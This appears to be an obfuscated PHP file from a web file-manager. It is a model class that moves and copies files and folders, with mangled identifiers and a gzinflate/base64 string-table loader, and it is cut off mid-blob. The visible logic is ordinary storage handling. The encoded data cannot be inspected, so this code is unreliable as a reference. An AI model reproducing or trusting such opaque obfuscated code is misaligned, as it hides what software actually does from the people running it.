$Ã…¢·Æ²‡[$ÈÌ“¤Àø] = $÷ÔÉ‰ÓÆá; if ($÷ÔÉ‰ÓÆá[$ƒğÄ[405]] == $ƒğÄ[87]) { $this->_childrenListAll($ÈÌ“¤Àø, $Ã…¢·Æ²‡); } } } private function sourceInfoCache($±µ¶) { if (isset($this->_childrenItemCache[$±µ¶])) { return $this->_childrenItemCache[$±µ¶]; } return $this->sourceInfo($±µ¶); } private function _childrenList($‰–) { if (isset($this->_childrenListCache[$‰–])) { return $this->_childrenListCache[$‰–]; } return $this->_childrenListSelect($‰–); } private function _childrenListSelect($¹) { $‘õ =& $_SERVER[èÍ×öˆøÉ]; $Çš§‹ØÇ = array($‘õ[492] => $¹, $‘õ[425] => $this->targetIsDelete); $‘…İ = $this->where($Çš§‹ØÇ)->select(); $‘…İ = $‘…İ ? $‘…İ : array(); $ˆ¼³•ıö¦± = array_to_keyvalue($‘…İ, $‘õ[397]); $this->_childrenListCache[$¹] = $ˆ¼³•ıö¦±; foreach ($ˆ¼³•ıö¦± as $¹ => $Ï¼ŸìéúÇâé) { $this->_childrenItemCache[$¹] = $Ï¼ŸìéúÇâé; } return $ˆ¼³•ıö¦±; } private function fileNameExistCache($‡¤Şñ, $¿) { $˜ÎÒ†åì =& $_SERVER[èÍ×öˆøÉ]; $¿ = strtolower($¿); $À½äá©Ã¡ = $this->_childrenList($‡¤Şñ); foreach ($À½äá©Ã¡ as $®ã) { if ($¿ == strtolower($®ã[$˜ÎÒ†åì[28]])) { return $®ã[$˜ÎÒ†åì[397]]; } } return !1; } private function fileNameAutoCache($…³İ›‚œš, $ûŒå, $è»òü, $Ş×·Š©µË¸) { $ø½¸²ÛÖ =& $_SERVER[èÍ×öˆøÉ]; $¡ë‹ĞˆŒ¸€ = $this->_childrenList($…³İ›‚œš); $Â¦Í²‹ = array_to_keyvalue($¡ë‹ĞˆŒ¸€, $ø½¸²ÛÖ[33], $ø½¸²ÛÖ[28]); return $this->fileNameAutoGet($Â¦Í²‹, $ûŒå, $è»òü, $Ş×·Š©µË¸); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($®ªÑ­‚¨, $æƒÊÆ§Ì, $ı­èÍÆà = REPEAT_REPLACE, $– = '') { $ü‚ =& $_SERVER[èÍ×öˆøÉ]; $¯ = $this->sourceInfo($®ªÑ­‚¨); $›Ã¢‡è = $this->sourceInfo($æƒÊÆ§Ì); if ($¯[$ü‚[492]] == $›Ã¢‡è[$ü‚[397]]) { if ($¯[$ü‚[425]] == $ü‚[87]) { Model($ü‚[423])->restore(array($®ªÑ­‚¨)); } if (!$– || $– == $¯[$ü‚[28]]) { return $®ªÑ­‚¨; } } $İæÂö‡‚¸ = $this->pathInfoMore($®ªÑ­‚¨); if ($this->isParentOf($®ªÑ­‚¨, $æƒÊÆ§Ì)) { return !1; } if (!$¯ || !$›Ã¢‡è || $›Ã¢‡è[$ü‚[405]] != $ü‚[87]) { return !1; } Hook::trigger($ü‚[584], $İæÂö‡‚¸); $this->targetIsDelete = intval($¯[$ü‚[425]]); if ($¯[$ü‚[492]] == $æƒÊÆ§Ì && $– != $¯[$ü‚[28]]) { $É”ûŸ = $this->fileNameExist($æƒÊÆ§Ì, $–); if ($É”ûŸ && $¯[$ü‚[405]] == $ü‚[191]) { $¹Ç = $this->sourceInfo($É”ûŸ); $¡‰© = $this->fileHistory($¹Ç, $¯[$ü‚[461]], $¯[$ü‚[78]]); if (!$¡‰©) { Model($ü‚[464])->remove($¯[$ü‚[461]]); } $this->removeNow($®ªÑ­‚¨, !1); $this->folderSizeReset($æƒÊÆ§Ì); Hook::trigger($ü‚[585], $İæÂö‡‚¸); return $É”ûŸ; } } $’¢Ê½ = $– ? $– : $¯[$ü‚[28]]; $this->lockMoveStart($®ªÑ­‚¨); $this->lockWriteStart($æƒÊÆ§Ì, $’¢Ê½); $óëîŸ»Ş²Ø = array($ü‚[554] => array(), $ü‚[586] => !1); $this->clearShare($®ªÑ­‚¨, $æƒÊÆ§Ì); $ÎíÇ”¤ò¥Œ = $this->fileNameExistCache($æƒÊÆ§Ì, $¯[$ü‚[28]]); $Œ‡¸¾¥ = $this->_move($®ªÑ­‚¨, $æƒÊÆ§Ì, $ı­èÍÆà, $óëîŸ»Ş²Ø, $–); $this->sourceCacheClear(); if ($¯[$ü‚[405]] == $ü‚[87] && $ÎíÇ”¤ò¥Œ) { $this->folderSizeResetChildren($Œ‡¸¾¥); } Model($ü‚[193])->linkAdd($óëîŸ»Ş²Ø[$ü‚[554]]); if ($ÎíÇ”¤ò¥Œ && $óëîŸ»Ş²Ø[$ü‚[586]]) { $this->removeNow($®ªÑ­‚¨, !1); } $this->lockMoveEnd($®ªÑ­‚¨); $this->lockWriteEnd($æƒÊÆ§Ì, $’¢Ê½); $this->folderSizeReset($¯[$ü‚[492]]); $this->folderSizeReset($æƒÊÆ§Ì); $º¼ = array($¯[$ü‚[492]], $æƒÊÆ§Ì); if ($¯[$ü‚[405]] == $ü‚[87]) { $º¼[] = $®ªÑ­‚¨; } $this->updateModifyTime($º¼); Model($ü‚[558])->eventMove($®ªÑ­‚¨, $¯[$ü‚[492]], $æƒÊÆ§Ì); Hook::trigger($ü‚[585], $İæÂö‡‚¸); return $Œ‡¸¾¥; } private function _move($„ÉÉ¾, $”öŞƒ€ÚŞ, $®„ÈªÒ½, &$ú, $ÀÅú‘Äãº»Â© = '') { $İÒ®Í£Ùô =& $_SERVER[èÍ×öˆøÉ]; $ªÑ÷Ï©ÈÉ = $this->sourceInfo($„ÉÉ¾); $ Ú’ìïÉ¸‘Ï = $ªÑ÷Ï©ÈÉ[$İÒ®Í£Ùô[405]] == $İÒ®Í£Ùô[87]; $Ÿ„–½Ú„‹ = $ÀÅú‘Äãº»Â© ? $ÀÅú‘Äãº»Â© : $ªÑ÷Ï©ÈÉ[$İÒ®Í£Ùô[28]]; $±éÙûü = $this->fileNameExistCache($”öŞƒ€ÚŞ, $Ÿ„–½Ú„‹); $this->lockMoveStart($„ÉÉ¾); $this->lockWriteStart($”öŞƒ€ÚŞ, $Ÿ„–½Ú„‹); if (!$±éÙûü) { return $this->_moveForce($„ÉÉ¾, $”öŞƒ€ÚŞ, $Ÿ„–½Ú„‹); } $¡ÙÚéôş¢ = $±éÙûü; $ü¦æ—šĞä = !1; if ($ Ú’ìïÉ¸‘Ï) { if ($®„ÈªÒ½ == REPEAT_RENAME_FOLDER) { $Ÿ„–½Ú„‹ = $this->fileNameAuto($”öŞƒ€ÚŞ, $Ÿ„–½Ú„‹, $®„ÈªÒ½, $ Ú’ìïÉ¸‘Ï); $¡ÙÚéôş¢ = $this->_moveForce($„ÉÉ¾, $”öŞƒ€ÚŞ, $Ÿ„–½Ú„‹); } else { if ($®„ÈªÒ½ == REPEAT_RENAME_FOLDER) { $®„ÈªÒ½ = REPEAT_RENAME; } $õ¬­¤§œÏÓÀ = $this->_childrenListSelect($„ÉÉ¾); foreach ($õ¬­¤§œÏÓÀ as $Ä”ÙÉÅÆ) { $this->_move($Ä”ÙÉÅÆ[$İÒ®Í£Ùô[397]], $±éÙûü, $®„ÈªÒ½, $ú); } $ü¦æ—šĞä = !0; } } else { if ($®„ÈªÒ½ == REPEAT_SKIP) { $ü¦æ—šĞä = !0; } else { if ($®„ÈªÒ½ == REPEAT_RENAME || $®„ÈªÒ½ == REPEAT_RENAME_FOLDER) { $Ÿ„–½Ú„‹ = $this->fileNameAuto($”öŞƒ€ÚŞ, $Ÿ„–½Ú„‹, $®„ÈªÒ½, $ Ú’ìïÉ¸‘Ï); $¡ÙÚéôş¢ = $this->_moveForce($„ÉÉ¾, $”öŞƒ€ÚŞ, $Ÿ„–½Ú„‹); } else { if ($®„ÈªÒ½ == REPEAT_REPLACE) { $¶§ôàå = $this->sourceInfoCache($±éÙûü); $Õ‡ø¥ÆÌë = $this->fileHistory($¶§ôàå, $ªÑ÷Ï©ÈÉ[$İÒ®Í£Ùô[461]], $ªÑ÷Ï©ÈÉ[$İÒ®Í£Ùô[78]]); $ü¦æ—šĞä = !0; if ($Õ‡ø¥ÆÌë) { $ú[$İÒ®Í£Ùô[554]][] = $ªÑ÷Ï©ÈÉ[$İÒ®Í£Ùô[461]]; } } } } } if ($ü¦æ—šĞä && !$ú[$İÒ®Í£Ùô[586]]) { $ú[$İÒ®Í£Ùô[586]] = !0; } return $¡ÙÚéôş¢; } private function _moveForce($Øò­–Ë¼†Ìà, $ÑˆüÍ, $šî¾çòæÒŒ) { $èæÛ—ûŸ†¿ø =& $_SERVER[èÍ×öˆøÉ]; $†±¨ = $this->sourceInfo($Øò­–Ë¼†Ìà); $½İŞüëÆ¤ı• = $this->sourceInfo($ÑˆüÍ); $áØ‘ = $†±¨[$èæÛ—ûŸ†¿ø[405]] == $èæÛ—ûŸ†¿ø[87]; $îõŠœÅèò = array($èæÛ—ûŸ†¿ø[396] => $½İŞüëÆ¤ı•[$èæÛ—ûŸ†¿ø[397]], $èæÛ—ûŸ†¿ø[578] => $½İŞüëÆ¤ı•[$èæÛ—ûŸ†¿ø[515]] . $½İŞüëÆ¤ı•[$èæÛ—ûŸ†¿ø[397]] . $èæÛ—ûŸ†¿ø[47], $èæÛ—ûŸ†¿ø[574] => $½İŞüëÆ¤ı•[$èæÛ—ûŸ†¿ø[406]], $èæÛ—ûŸ†¿ø[575] => $½İŞüëÆ¤ı•[$èæÛ—ûŸ†¿ø[498]], $èæÛ—ûŸ†¿ø[577] => USER_ID, $èæÛ—ûŸ†¿ø[415] => $šî¾çòæÒŒ); $×ü‹ç€Ò“èÆ = $†±¨[$èæÛ—ûŸ†¿ø[406]] == SourceModel::TYPE_GROUP && $½İŞüëÆ¤ı•[$èæÛ—ûŸ†¿ø[406]] == SourceModel::TYPE_GROUP && $†±¨[$èæÛ—ûŸ†¿ø[498]] == $½İŞüëÆ¤ı•[$èæÛ—ûŸ†¿ø[498]]; if (!$×ü‹ç€Ò“èÆ && $this->moveClearAuth) { Model($èæÛ—ûŸ†¿ø[496])->authClear($Øò­–Ë¼†Ìà); } $ññ = $†±¨[$èæÛ—ûŸ†¿ø[425]] == $èæÛ—ûŸ†¿ø[87] && $½İŞüëÆ¤ı•[$èæÛ—ûŸ†¿ø[425]] != $èæÛ—ûŸ†¿ø[87]; if ($ññ) { $îõŠœÅèò[$èæÛ—ûŸ†¿ø[424]] = 0; } if ($áØ‘) { $§âÎÒëÃ = array($èæÛ—ûŸ†¿ø[578] => array($èæÛ—ûŸ†¿ø[538], $†±¨[$èæÛ—ûŸ†¿ø[515]] . $†±¨[$èæÛ—ûŸ†¿ø[397]] . $èæÛ—ûŸ†¿ø[539])); $Ù›½¹ÏÕßÒÌ× = $†±¨[$èæÛ—ûŸ†¿ø[515]] . $†±¨[$èæÛ—ûŸ†¿ø[397]] . $èæÛ—ûŸ†¿ø[47]; $Ì¨‡‹Ë¨Çî = $½İŞüëÆ¤ı•[$èæÛ—ûŸ†¿ø[515]] . $½İŞüëÆ¤ı•[$èæÛ—ûŸ†¿ø[397]] . $èæÛ—ûŸ†¿ø[47] . $†±¨[$èæÛ—ûŸ†¿ø[397]] . $èæÛ—ûŸ†¿ø[47]; $ÄŸŞ = array($èæÛ—ûŸ†¿ø[578] => array($èæÛ—ûŸ†¿ø[587], "\162\145\160\x6c\x61\x63\x65\x28\160\141\162\145\156\x74\x4c\145\166\x65\x6c\x2c\47{$Ù›½¹ÏÕßÒÌ×}\x27\x2c\47{$Ì¨‡‹Ë¨Çî}\x27\x29"), $èæÛ—ûŸ†¿ø[574] => $½İŞüëÆ¤ı•[$èæÛ—ûŸ†¿ø[406]], $èæÛ—ûŸ†¿ø[575] => $½İŞüëÆ¤ı•[$èæÛ—ûŸ†¿ø[498]]); if ($ññ) { $ÄŸŞ[$èæÛ—ûŸ†¿ø[424]] = 0; } $this->where($§âÎÒëÃ)->data($ÄŸŞ)->save(); } $this->where(array($èæÛ—ûŸ†¿ø[412] => $Øò­–Ë¼†Ìà))->data($îõŠœÅèò)->save(); return $Øò­–Ë¼†Ìà; } private function clearShare($Ç˜Îâ, $ùöÇ¨) { $Ù¦§úÉº× =& $_SERVER[èÍ×öˆøÉ]; $ò¨ƒŞ = $this->sourceInfo($Ç˜Îâ); $Çó×­õË×¹Ï = $this->sourceInfo($ùöÇ¨); if ($ò¨ƒŞ[$Ù¦§úÉº×[498]] == $Çó×­õË×¹Ï[$Ù¦§úÉº×[498]] && $ò¨ƒŞ[$Ù¦§úÉº×[406]] == $Ù¦§úÉº×[588]) { return; } $©Ê„ = array($Ù¦§úÉº×[515] => array($Ù¦§úÉº×[538], $ò¨ƒŞ[$Ù¦§úÉº×[515]] . $Ç˜Îâ . $Ù¦§úÉº×[539])); $Ø‹Ò¤°¸î³ıè = $this->field($Ù¦§úÉº×[412])->where($©Ê„)->getField($Ù¦§úÉº×[397], !0); if (!$Ø‹Ò¤°¸î³ıè) { return; } $©Ê„ = array($Ù¦§úÉº×[397] => array($Ù¦§úÉº×[7], $Ø‹Ò¤°¸î³ıè), $Ù¦§úÉº×[489] => 1); $ï¬ = Model($Ù¦§úÉº×[589])->field($Ù¦§úÉº×[482])->where($©Ê„)->select(); if (!$ï¬) { return; } $ï¬ = array_to_keyvalue($ï¬, $Ù¦§úÉº×[33], $Ù¦§úÉº×[482]); $©Ê„ = array($Ù¦§úÉº×[482] => array($Ù¦§úÉº×[7], $ï¬)); Model($Ù¦§úÉº×[589])->where($©Ê„)->save(array($Ù¦§úÉº×[489] => 0)); Model($Ù¦§úÉº×[590])->where($©Ê„)->delete(); } public function copyFolderFromIO($ãÍ“÷–, $©Ï, $Íª¾ŒòÎ·ç, $ó¥ó•™ê¦, $œÓ®, $ëÏøÑªñ÷ = false) { $Ü‹ª =& $_SERVER[èÍ×öˆøÉ]; $»„ã¨õ = array($Ü‹ª[555] => array(), $Ü‹ª[556] => array(), $Ü‹ª[554] => array(), $Ü‹ª[591] => array()); $Êø÷Ä×÷ÑÕ¯¾ = $ëÏøÑªñ÷ ? $ëÏøÑªñ÷ : $ãÍ“÷–->pathThis($©Ï); $¸Ó¢•ª¡™¨ = $this->fileNameExist($Íª¾ŒòÎ·ç, $Êø÷Ä×÷ÑÕ¯¾); $û = $this->mkdir($Íª¾ŒòÎ·ç, $Êø÷Ä×÷ÑÕ¯¾, $ó¥ó•™ê¦); if (!$¸Ó¢•ª¡™¨ || $ó¥ó•™ê¦ == REPEAT_RENAME_FOLDER) { $ó¥ó•™ê¦ = !1; } if ($¸Ó¢•ª¡™¨) { $this->_childrenAllMake($¸Ó¢•ª¡™¨); } Hook::trigger($Ü‹ª[592]); $this->_copyChildTo($ãÍ“÷–, $©Ï, $û, $ó¥ó•™ê¦, $»„ã¨õ, $œÓ®); Hook::trigger($Ü‹ª[593]); if ($û) { $this->folderSizeResetChildren($û); } $this->_childrenListClear(); Model($Ü‹ª[557])->addAll($»„ã¨õ[$Ü‹ª[555]], array(), !0); Model($Ü‹ª[558])->eventCopy($û); $this->saveAll($»„ã¨õ[$Ü‹ª[556]]); Model($Ü‹ª[464])->linkAdd($»„ã¨õ[$Ü‹ª[554]]); Model($Ü‹ª[464])->remove($»„ã¨õ[$Ü‹ª[591]]); $this->folderSizeReset($Íª¾ŒòÎ·ç); $this->updateModifyTime($Íª¾ŒòÎ·ç); return $û; } private function _copyChildTo($““, $‰“, $Ôµ¡Ù¬ê, $›Š®, &$µïµ÷õ³¦, $¶ÒÓºÍ¤ˆÊë¦) { $¿åÚ±Œí =& $_SERVER[èÍ×öˆøÉ]; $÷‘ŞëÅÀõ‚ = $this->sourceInfoCache($Ôµ¡Ù¬ê); $ÓÂ¬ = $““->listPath($‰“); $ÓÂ¬ = $ÓÂ¬ ? $ÓÂ¬ : array($¿åÚ±Œí[74] => array(), $¿åÚ±Œí[75] => array()); $©Î‡åÎè‚üÁ— = array_merge($ÓÂ¬[$¿åÚ±Œí[74]], $ÓÂ¬[$¿åÚ±Œí[75]]); $Œà° = $this->_addFiles($““, $ÓÂ¬[$¿åÚ±Œí[74]], $¶ÒÓºÍ¤ˆÊë¦); $§Úì‡Ğø = array(); foreach ($©Î‡åÎè‚üÁ— as &$À ÛÓüœ) { if (isset($Œà°[$À ÛÓüœ[$¿åÚ±Œí[28]]])) { $À ÛÓüœ = $Œà°[$À ÛÓüœ[$¿åÚ±Œí[28]]]; } $À ÛÓüœ[$¿åÚ±Œí[405]] = $À ÛÓüœ[$¿åÚ±Œí[29]] == $¿åÚ±Œí[77]; $À ÛÓüœ[$¿åÚ±Œí[407]] = _get($À ÛÓüœ, $¿åÚ±Œí[168], $¿åÚ±Œí[33]); $À ÛÓüœ[$¿åÚ±Œí[78]] = _get($À ÛÓüœ, $¿åÚ±Œí[78], 0); $À ÛÓüœ[$¿åÚ±Œí[461]] = _get($À ÛÓüœ, $¿åÚ±Œí[461], 0); if (!isset($À ÛÓüœ[$¿åÚ±Œí[594]]) && $À ÛÓüœ[$¿åÚ±Œí[461]]) { $µïµ÷õ³¦[$¿åÚ±Œí[591]][] = $À ÛÓüœ[$¿åÚ±Œí[461]]; } if ($›Š®) { $šåïÑø˜ = $this->fileNameExistCache($Ôµ¡Ù¬ê, $À ÛÓüœ[$¿åÚ±Œí[28]]); if ($šåïÑø˜) { if ($À ÛÓüœ[$¿åÚ±Œí[405]] || $›Š® == REPEAT_SKIP) { continue; } if ($›Š® == REPEAT_REPLACE) { $Æ¤³‡°ıØÒ = $this->sourceInfoCache($šåïÑø˜); $ªºÉç©îÄÊÍ = $this->fileHistory($Æ¤³‡°ıØÒ, $À ÛÓüœ[$¿åÚ±Œí[461]], $À ÛÓüœ[$¿åÚ±Œí[78]]); if ($ªºÉç©îÄÊÍ) { $µïµ÷õ³¦[$¿åÚ±Œí[554]][] = $À ÛÓüœ[$¿åÚ±Œí[461]]; } continue; } else { if ($›Š® == REPEAT_RENAME) { $À ÛÓüœ[$¿åÚ±Œí[28]] = $this->fileNameAutoCache($Ôµ¡Ù¬ê, $À ÛÓüœ[$¿åÚ±Œí[28]], $›Š®, !1); } } } } if (!$À ÛÓüœ[$¿åÚ±Œí[405]] && $À ÛÓüœ[$¿åÚ±Œí[461]]) { $µïµ÷õ³¦[$¿åÚ±Œí[554]][] = $À ÛÓüœ[$¿åÚ±Œí[461]]; } $§Úì‡Ğø[] = $this->_makeItemData($À ÛÓüœ, $÷‘ŞëÅÀõ‚, $À ÛÓüœ[$¿åÚ±Œí[28]]); } unset($À ÛÓüœ); if (!empty($§Úì‡Ğø)) { $this->addAll($§Úì‡Ğø); $this->_childrenListSelect($Ôµ¡Ù¬ê); } $½Î­íåÃ = $this->_childrenList($Ôµ¡Ù¬ê); $½Î­íåÃ = array_to_keyvalue($½Î­íåÃ, $¿åÚ±Œí[28]); foreach ($©Î‡åÎè‚üÁ— as $À ÛÓüœ) { $Æ¤³‡°ıØÒ = $½Î­íåÃ[$À ÛÓüœ[$¿åÚ±Œí[28]]]; $û—¶¾Ê ˆÆ = $Æ¤³‡°ıØÒ[$¿åÚ±Œí[397]]; $this->_copyApplyMeta($Æ¤³‡°ıØÒ, $µïµ÷õ³¦); if ($À ÛÓüœ[$¿åÚ±Œí[29]] == $¿åÚ±Œí[77]) { $À ÛÓüœ[$¿åÚ±Œí[76]] = $““->getPathInner($À ÛÓüœ[$¿åÚ±Œí[76]]); $this->_copyChildTo($““, $À ÛÓüœ[$¿åÚ±Œí[76]], $û—¶¾Ê ˆÆ, $›Š®, $µïµ÷õ³¦, $¶ÒÓºÍ¤ˆÊë¦); } } } private function _addFiles($£¬…‘²¢„ò†, $€†¡øóëşÕÌ, $¿òÍË˜º÷‰×) { $àŠ =& $_SERVER[èÍ×öˆøÉ]; if (!$€†¡øóëşÕÌ || count($€†¡øóëşÕÌ) == 0) { return array(); } $  = array(); foreach ($€†¡øóëşÕÌ as &$Ğ­§ÚŸ»Õî) { Hook::trigger($àŠ[595], $Ğ­§ÚŸ»Õî); $Ğ­§ÚŸ»Õî[$àŠ[76]] = $£¬…‘²¢„ò†->getPathInner($Ğ­§ÚŸ»Õî[$àŠ[76]]); $µ­ÆÕÏºûÁ = $£¬…‘²¢„ò†->hashSimple($Ğ­§ÚŸ»Õî[$àŠ[76]]); $öÖ… = $£¬…‘²¢„ò†->hashMd5($Ğ­§ÚŸ»Õî[$àŠ[76]]); if (strlen($öÖ…) > 10 && !isset($ [$öÖ…])) { $ [$öÖ…] = array(); } $Ğ­§ÚŸ»Õî[$àŠ[171]] = $µ­ÆÕÏºûÁ; $Ğ­§ÚŸ»Õî[$àŠ[170]] = $öÖ…; Hook::trigger($àŠ[596], $Ğ­§ÚŸ»Õî); $ [$öÖ…][] =& $Ğ­§ÚŸ»Õî; if (count($ [$öÖ…]) > 1) { $Ğ­§ÚŸ»Õî[$àŠ[594]] = !0; } } unset($Ğ­§ÚŸ»Õî); $ªØ¨ùï³´¸… = array($àŠ[170] => array($àŠ[7], array_keys($ ))); $ŠĞ = Model($àŠ[597]); $·¬ = $ŠĞ->where($ªØ¨ùï³´¸…)->select(); $·¬ = $·¬ ? $·¬ : array(); foreach ($·¬ as $Ò„¬ ¡·š) { if (!isset($ [$Ò„¬ ¡·š[$àŠ[170]]])) { continue; } $Äàœ‚ = $ [$Ò„¬ ¡·š[$àŠ[170]]]; foreach ($Äàœ‚ as &$Ğ­§ÚŸ»Õî) { $Ğ­§ÚŸ»Õî[$àŠ[461]] = $Ò„¬ ¡·š[$àŠ[461]]; $Ğ­§ÚŸ»Õî[$àŠ[594]] = !0; } unset($Ğ­§ÚŸ»Õî); } $İì€õ­âï = array(); foreach ($€†¡øóëşÕÌ as $µµ™Úà) { if (isset($µµ™Úà[$àŠ[594]]) && $µµ™Úà[$àŠ[594]]) { continue; } $¶À = $£¬…‘²¢„ò†->getPathInner($µµ™Úà[$àŠ[76]]); $Õóù = $ŠĞ->addFileMake($¶À, $µµ™Úà[$àŠ[78]], $µµ™Úà[$àŠ[171]], $µµ™Úà[$àŠ[170]], $µµ™Úà[$àŠ[28]], $¿òÍË˜º÷‰×); $İì€õ­âï[] = $Õóù; } $ŠĞ->addAll($İì€õ­âï); $ªØ¨ùï³´¸… = array($àŠ[170] => array($àŠ[7], array_keys($ ))); $·¬ = $ŠĞ->where($ªØ¨ùï³´¸…)->select(); $·¬ = $·¬ ? $·¬ : array(); foreach ($·¬ as $Ò„¬ ¡·š) { if (!isset($ [$Ò„¬ ¡·š[$àŠ[170]]])) { continue; } $Ì““ˆ =& $ [$Ò„¬ ¡·š[$àŠ[170]]]; foreach ($Ì““ˆ as &$Ğ­§ÚŸ»Õî) { $Ğ­§ÚŸ»Õî[$àŠ[461]] = $Ò„¬ ¡·š[$àŠ[461]]; } unset($Ğ­§ÚŸ»Õî); } $ˆ—õíš‚–³× = array(); foreach ($€†¡øóëşÕÌ as $°º–µúó‡´) { $ˆ—õíš‚–³×[$°º–µúó‡´[$àŠ[28]]] = $°º–µúó‡´; } return $ˆ—õíš‚–³×; } } goto BƒèŞºÚš¸; cŸ£âŠ„: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xe8\xcd\xd7\x8d\xf6\x88\xf8\xc9", "\x87\xb4\x98\xbd\xd0\xf6\xae\xcd"); $_SERVER[èÍ×öˆøÉ] = explode("\174\4\174\3\174\2", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\174\123\125\366\260\333\270\73\352\250\270\353\263\2\155\41\113\313\116\241\224\264\115\333\110\332\224\44\145\153\113\170\111\136\222".base64_decode('1yZ56Xsv3QB3cQFXFBXUEZcRF0BxdBS3mRHclxk3GHFnFRVHR3Eb/b673/tegv6/')."\337\367\375\176\237\77\154\336\75\167\337\316\75\347\334\163\316\275\367\335\77\176\367\304\227\237\56\70\150\301\201\13\16\170\372\306\277\340\217\5\373\203\277\373\343\357\63\27"."\x1f\xba\x1f\xfa\xef\xb8\xc5\x57\x94\x95\x35\x8d\x3b\x7c\x64\xcb\x91\x57\xff\x79\xb5\xfc\x80\xbc\x46\x5e\x12\xf0\xbf\xfc\x8a\xef\xa8\xd7\x1e\x38\xc7\xbb\xe3\xce\x97\x7\x76\xec\xbf\xdf\x17\x15"."\247\277\126\5\22\343\274\125\370\107\312\152\246\244\364\253\206\151\140\100\114\313\46\324\44\376\126\263\370\327\215\177\214\236\264\152\52\370\73\322\22\10\107\102\155\255\255\336"."\140\70\102\112\24\343\63\132\234\174\345\144\135\316\220\302\163\212\156\200\252\304\342\42\71\55\247\144\55\20\16\210\313\246\34\225\15\122\122\175\155\244\336\333\352\17\314\216"."\204\147\267\172\111\212\150\244\47\257\350\3\70\204\76\103\246\254\233\141\65\243\260\24\175\72\153\127\255\267\321\327\42\205\203\236\226\220\247\56\354\13\264\140\160\135\240\271"."\xd9\x17\x2e\x84\x7\x3\x7e\x7f\xad\xa7\x6e\x5a\x61\x4c\x6b\xd0\xd3\xd8\xec\x91\x40\xfb\xd2\x4a\x44\xcd\x26\xb4\x32\x69\x1e\x8e\x99\x27\x95\xe3\x8f\x6\x55\x49\xc7\xf1\x67\x56\xa6\xcd\x31\x7".base64_decode('cuQrzL7AHGTz6TQOtLAv0n4lIefTZMzqxUBOVzMy7fo0ZYBB8YecNzU1G8MBb7+p')."\313\34\16\132\34\323\225\214\222\45\105\205\274\176\157\135\130\202\315\224\32\202\201\146\211\114\105\106\66\114\105\227\146\66\171\203\136\11\66\275\272\24\365\270\124\302\371\332"."\132\300\200\110\36\277\137\332\127\11\246\222\311\321\142\160\236\42\205\5\202\365\336\240\124\73\133\342\343\24\323\62\31\55\353\2\245\200\371\64\205\246\172\203\101\374\341\40"."\53\330\357\203\123\107\2\201\206\206\220\227\205\110\347\246\373\101\113\106\223\125\152\11\305\23\151\63\322\53\247\363\164\261\166\343\337\122\362\103\176\65\203\54\340\36\65\253"."\xe6\xc9\x62\x25\x45\x68\x1a\xdb\x39\xe4\x23\x4f\x53\x2b\x14\xa2\xc4\xc9\x47\x6\xe4\xd7\xc8\xe6\x2\x3b\xad\x17\x7f\x56\x4f\xc1\xbf\x93\x48\xa2\x68\x4\xc6\x29\xba\x19\x51\xb2\x31\x2d\xae\x66".base64_decode('yX6sIXuPrEDZTNXrKkhHCtRcMS030Kz1ks4k1LTiZ9stoaXjis7DOZBdjCG9UgeF')."\xdc\x2d\xf9\x8c\x98\x84\x5\x63\x29\x35\x1d\xd7\xe9\x2e\xfd\xb5\x94\x0\xf\xa8\x89\x1\xbe\x1b\xd\x2d\xaf\xc7\x14\x1f\xd8\x2f\x3c\x6f\x2b\x6b\x49\x25\x49\xa4\x98\x26\xe8\xb4\x41\xfb\xd5\x96"."\x4b\x6b\x72\x3c\xa4\xe8\x42\x5f\x1b\x40\xc6\x40\xde\x14\x81\x79\x94\xac\x41\xd3\x33\xf5\x0\x6f\x90\xfa\xc1\x6e\x51\xdb\x8a\x44\x74\xd3\xfd\x12\x17\x86\xd0\x45\xf0\x5d\x59\xfb\x5\xce\x5f\x3a"."\xdb\xa7\x82\x3f\xe5\x4\xf9\x75\x90\xa6\xa5\x94\x74\x3a\xa2\xf4\x2b\x64\x5f\x65\xe2\x63\xd\xda\x57\xb7\x11\x55\xb3\x6e\x0\xc1\x41\x5f\x20\x92\x92\x8d\x54\x73\x7c\x6c\x4\xe5\xa2\x38\x35\xae"."\xf4\xbb\x72\xa9\x1c\xd9\xfa\x6c\xb7\x77\x58\xd6\x3d\x9c\x9d\x16\xcd\xf4\xa\x98\x39\xad\xc5\xe4\xb4\xd8\x53\xfc\x9d\x32\xcd\x5c\x48\xc9\xc6\xe1\x80\x90\x1e\x69\x7d\x59\x34\x60\x39\x45\x21\x89"."\xea\x1d\x52\x5c\x6a\x96\x66\x4b\x4d\x55\x6a\x95\x41\x33\x66\xd2\xec\x8b\xf6\x8e\xc1\xc\x6\x34\xfb\xc9\x8a\x29\x21\x61\xa5\xdf\x24\x83\x22\x4d\x8a\xa5\x64\x1d\x4c\x57\x75\xde\x4c\x38\x27\x10"."\374\222\313\245\325\230\154\252\132\326\255\305\114\305\164\32\246\256\310\244\64\117\54\246\30\206\263\116\313\232\272\226\166\172\322\151\255\317\31\320\325\244\232\255\222\106\20\154"."\14\42\301\176\167\102\14\131\105\66\161\311\44\11\256\25\210\40\106\340\332\350\346\144\251\165\71\153\44\24\335\351\45\233\246\112\2\363\301\20\44\115\126\257\32\71\315\120"."\x61\xf3\xaa\x24\xd9\x34\xe5\x58\xa\x22\x17\x5e\x7c\xf5\xaf\xa4\x57\xb3\x69\x35\xab\x14\xa4\xf5\xf6\xe7\x54\x5d\x31\x68\x5b\xa5\xc6\xe6\x30\x29\x4\x94\xae\x38\x5b\x75\x39\x99\x91\xab\xa4\x5c"."\76\12\106\206\354\336\42\60\234\232\14\115\225\24\203\101\207\224\311\33\246\123\127\0\226\122\301\171\110\346\330\227\160\66\303\255\245\52\161\147\10\40\163\2\36\135\61\106"."\2\313\106\242\161\30\332\24\16\267\106\174\15\340\314\156\361\106\232\75\341\272\46\322\154\123\116\322\66\373\1\212\146\105\122\340\54\47\330\142\160\141\265\200\276\162\140\253".base64_decode('1qfooOLagSqpW4tHtX4XjYKJQwCH0MRwunOmMyhnk3B8ogOmQpaf0Zu0DrRfySbN')."\x14\xcd\x18\xf2\x6\x67\x78\x83\x91\x50\xa0\x21\x3c\xd3\x13\x24\xa7\x7d\x16\x